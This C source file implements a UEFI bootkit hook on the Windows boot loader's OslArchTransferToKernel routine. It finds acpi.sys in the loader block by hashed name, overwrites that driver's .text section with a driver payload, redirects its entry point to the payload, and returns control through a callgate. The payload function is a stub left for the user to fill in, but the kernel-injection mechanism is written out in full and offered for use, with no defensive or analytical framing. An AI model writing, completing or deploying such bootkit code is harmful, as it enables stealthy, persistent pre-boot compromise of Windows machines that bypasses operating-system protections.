#include <efi.h>
#include <efilib.h>

// Windows PE structures
#define IMAGE_DOS_SIGNATURE 0x5A4D
#define IMAGE_NT_SIGNATURE  0x00004550
#define IMAGE_SCN_MEM_EXECUTE 0x20000000

// LIST_ENTRY structure (Windows kernel)
typedef struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY;

// UNICODE_STRING structure (Windows kernel)
typedef struct _UNICODE_STRING {
    UINT16 Length;
    UINT16 MaximumLength;
    WCHAR *Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

// LDR_DATA_TABLE_ENTRY structure
typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    VOID *DllBase;
    VOID *EntryPoint;
    UINT32 SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    // ... rest of the structure
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

// Windows Loader Parameter Block
typedef struct _PARAMETER_BLOCK {
    UINT32 OsMajorVersion;
    UINT32 OsMinorVersion;
    UINT32 Length;
    UINT32 Reserved;
    LIST_ENTRY LoadOrderListHead;
    LIST_ENTRY MemoryDescriptorListHead;
    LIST_ENTRY BootDriverListHead;
} PARAMETER_BLOCK, *PPARAMETER_BLOCK;

// PE structures (already defined in your code, but adding for completeness)
typedef struct _IMAGE_DOS_HEADER {
    UINT16 e_magic;
    UINT16 e_cblp;
    UINT16 e_cp;
    UINT16 e_crlc;
    UINT16 e_cparhdr;
    UINT16 e_minalloc;
    UINT16 e_maxalloc;
    UINT16 e_ss;
    UINT16 e_sp;
    UINT16 e_csum;
    UINT16 e_ip;
    UINT16 e_cs;
    UINT16 e_lfarlc;
    UINT16 e_ovno;
    UINT16 e_res[4];
    UINT16 e_oemid;
    UINT16 e_oeminfo;
    UINT16 e_res2[10];
    UINT32 e_lfanew;
} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

typedef struct _IMAGE_FILE_HEADER {
    UINT16 Machine;
    UINT16 NumberOfSections;
    UINT32 TimeDateStamp;
    UINT32 PointerToSymbolTable;
    UINT32 NumberOfSymbols;
    UINT16 SizeOfOptionalHeader;
    UINT16 Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

typedef struct _IMAGE_DATA_DIRECTORY {
    UINT32 VirtualAddress;
    UINT32 Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

typedef struct _IMAGE_OPTIONAL_HEADER64 {
    UINT16 Magic;
    UINT8  MajorLinkerVersion;
    UINT8  MinorLinkerVersion;
    UINT32 SizeOfCode;
    UINT32 SizeOfInitializedData;
    UINT32 SizeOfUninitializedData;
    UINT32 AddressOfEntryPoint;
    UINT32 BaseOfCode;
    UINT64 ImageBase;
    UINT32 SectionAlignment;
    UINT32 FileAlignment;
    UINT16 MajorOperatingSystemVersion;
    UINT16 MinorOperatingSystemVersion;
    UINT16 MajorImageVersion;
    UINT16 MinorImageVersion;
    UINT16 MajorSubsystemVersion;
    UINT16 MinorSubsystemVersion;
    UINT32 Win32VersionValue;
    UINT32 SizeOfImage;
    UINT32 SizeOfHeaders;
    UINT32 CheckSum;
    UINT16 Subsystem;
    UINT16 DllCharacteristics;
    UINT64 SizeOfStackReserve;
    UINT64 SizeOfStackCommit;
    UINT64 SizeOfHeapReserve;
    UINT64 SizeOfHeapCommit;
    UINT32 LoaderFlags;
    UINT32 NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[16];
} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;

typedef struct _IMAGE_NT_HEADERS64 {
    UINT32 Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;

typedef struct _IMAGE_SECTION_HEADER {
    UINT8  Name[8];
    UINT32 VirtualSize;
    UINT32 VirtualAddress;
    UINT32 SizeOfRawData;
    UINT32 PointerToRawData;
    UINT32 PointerToRelocations;
    UINT32 PointerToLinenumbers;
    UINT16 NumberOfRelocations;
    UINT16 NumberOfLinenumbers;
    UINT32 Characteristics;
} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

// Global storage for driver payload
typedef struct _EFTBL {
    VOID *KernelBuf;
    UINTN KernelLen;
    VOID *KernelBase;
    VOID *TgtDrvImgSect;
    VOID *TgtDrvImgBase;
    VOID *TgtDrvLdrEntry;
    UINT32 TgtDrvAddressOfEntrypoint;
    VOID *OslArchTransferToKernelGate;
} EFTBL, *PEFTBL;

// Globals
extern VOID *OslArchTransferToKernelCallGate;
extern VOID *OriginalOslArchTransferToKernelAddr;
extern UINTN OslFunctionOffset;
extern UINT8 original_osl_transfer_bytes[0x30];

// Global EFI table storage
EFTBL GlobalEfiTable = {0};

// Driver main payload (stub - replace with your actual driver)
VOID DrvMain(VOID) {
    // Your driver code here
    return;
}

// Helper macros
#define CONTAINING_RECORD(address, type, field) \
    ((type *)((UINT8 *)(address) - (UINTN)(&((type *)0)->field)))

#define IMAGE_FIRST_SECTION(ntheader) \
    ((PIMAGE_SECTION_HEADER)((UINTN)(ntheader) + \
     FIELD_OFFSET(IMAGE_NT_HEADERS64, OptionalHeader) + \
     ((ntheader))->FileHeader.SizeOfOptionalHeader))

#define FIELD_OFFSET(type, field) ((UINTN)&(((type *)0)->field))

// Simple hash function for string comparison
UINT32 HashString(VOID *Buffer, UINTN Length) {
    UINT32 Hash = 0x811c9dc5;
    UINT8 *Ptr = (UINT8 *)Buffer;
    UINTN Len = Length;
    
    if (Len == 0 && Buffer != NULL) {
        // Null-terminated string
        while (*Ptr) {
            Hash ^= *Ptr++;
            Hash *= 0x01000193;
        }
    } else {
        // Fixed length
        while (Len--) {
            Hash ^= *Ptr++;
            Hash *= 0x01000193;
        }
    }
    
    return Hash;
}

// Main hook function
__attribute__((optimize("-O2")))  // Force optimization for tail call
VOID EFIAPI OslArchTransferToKernelHook(VOID *LoaderBlock, VOID *Entry) {
    UINTN Len = 0;
    PEFTBL Eft = NULL;
    PLIST_ENTRY Hdr = NULL;
    PLIST_ENTRY Ent = NULL;
    PPARAMETER_BLOCK Blk = NULL;
    PIMAGE_DOS_HEADER Ntd = NULL;
    PIMAGE_DOS_HEADER Dos = NULL;
    PIMAGE_NT_HEADERS64 Nth = NULL;
    PIMAGE_SECTION_HEADER Sec = NULL;
    PLDR_DATA_TABLE_ENTRY Ldr = NULL;
    
    // Get EfiTable address
    Eft = &GlobalEfiTable;
    Blk = (PPARAMETER_BLOCK)LoaderBlock;
    
    // Initialize list values
    Hdr = &Blk->LoadOrderListHead;
    Ent = Hdr->Flink;
    
    // Enumerate the list to find acpi.sys
    while (Ent != Hdr) {
        // Get the LDR_DATA_TABLE_ENTRY
        Ldr = CONTAINING_RECORD(Ent, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        
        // Is this acpi.sys? (hash: 0x5dc8930f)
        if (HashString(Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length) == 0x5dc8930f) {
            Dos = (PIMAGE_DOS_HEADER)Ldr->DllBase;
            Nth = (PIMAGE_NT_HEADERS64)((UINT8 *)Dos + Dos->e_lfanew);
            Sec = IMAGE_FIRST_SECTION(Nth);
            
            // Enumerate all PE sections
            for (INT32 Idx = 0; Idx < Nth->FileHeader.NumberOfSections; ++Idx) {
                // Is this a .text section? (hash: 0x0b6dca4d)
                if (HashString(&Sec[Idx].Name, 0) == 0x0b6dca4d) {
                    // Locate the ntoskrnl image base
                    Ntd = (PIMAGE_DOS_HEADER)((UINTN)Entry & ~(0x1000 - 1));
                    while (Ntd->e_magic != IMAGE_DOS_SIGNATURE) {
                        // Decrement by a page
                        Ntd = (PIMAGE_DOS_HEADER)((UINT8 *)Ntd - 0x1000);
                    }
                    
                    // Store information for DrvMain to retrieve
                    Eft->KernelBuf = (VOID *)DrvMain;  // Pointer to driver code
                    Eft->KernelLen = 0x1000;  // Size of driver (adjust as needed)
                    Eft->KernelBase = Ntd;
                    Eft->TgtDrvImgSect = &Sec[Idx];
                    Eft->TgtDrvImgBase = Ldr->DllBase;
                    Eft->TgtDrvLdrEntry = Ldr;
                    Eft->TgtDrvAddressOfEntrypoint = Nth->OptionalHeader.AddressOfEntryPoint;
                    
                    // Calculate driver payload length
                    Len = 0x1000;  // Adjust based on your actual driver size
                    
                    // Copy DrvMain into acpi.sys .text section
                    __builtin_memcpy(
                        (UINT8 *)Dos + Sec[Idx].VirtualAddress,
                        (VOID *)DrvMain,
                        Len
                    );
                    
                    // Hook the entry point
                    Ldr->EntryPoint = (UINT8 *)Dos + Sec[Idx].VirtualAddress;
                    Nth->OptionalHeader.AddressOfEntryPoint = Sec[Idx].VirtualAddress;
                    
                    // Set execute permission on section
                    Sec[Idx].Characteristics |= IMAGE_SCN_MEM_EXECUTE;
                    
                    // Done with this section
                    break;
                }
            }
            // Done with acpi.sys
            break;
        }
        
        // Next entry
        Ent = Ent->Flink;
    }
    
    // Store callgate address for later use
    Eft->OslArchTransferToKernelGate = OslArchTransferToKernelCallGate;
    
    // Execute original OslArchTransferToKernel via callgate
    // This MUST be the last line - it's a tail call
    ((VOID (*)(VOID *, VOID *))OslArchTransferToKernelCallGate)(LoaderBlock, Entry);
}